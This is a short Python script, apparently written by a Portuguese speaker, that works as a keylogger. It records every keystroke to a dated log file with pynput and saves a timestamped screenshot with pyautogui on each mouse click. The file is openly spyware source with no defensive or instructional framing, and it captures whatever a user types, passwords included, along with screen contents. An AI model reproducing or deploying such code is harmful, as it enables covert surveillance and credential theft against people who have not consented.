from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as py

dataAtual = datetime.now()
data = dataAtual.strftime("%d - %m")
diretorioRaiz = "/Users/Usuário/Desktop/keyloger" + data + "/"
arquiviosLog = diretorioRaiz + 'Keylogger.log'

try:
    os.mkdir(diretorioRaiz)
except:
    pass

def on_press(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'key.space', '', tecla)
    tecla = re.sub(r'key.enter', '\n', tecla)
    tecla = re.sub(r'key.tab', '\t', tecla)
    tecla = re.sub(r'key.backspace', 'apagar', tecla)
    tecla = re.sub(r'key.*', '', tecla)

    with open(arquiviosLog, 'a') as log:
        if str(tecla) == str("apagar"):
            if os.stat(arquiviosLog).st_size != 0:
                tecla = re.sub(r'Key.backspace', '', tecla)
                log.seek(0,2)
                caractere = log.tell()
                log.truncate(caractere - 1)
        else:
            log.write(tecla)

def on_click(x, y, button, pressed):
    if pressed:
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H:%M:%S")
        minhaPrint.save(os.path.join(diretorioRaiz, "printKeylogger_" + horarioPrint + ".jpg"))



KeyboardListener = KeyboardListener(on_press=on_press)
MouseListener = MouseListener(on_click=on_click)

KeyboardListener.start()
MouseListener.start()
KeyboardListener.join()
MouseListener.join()


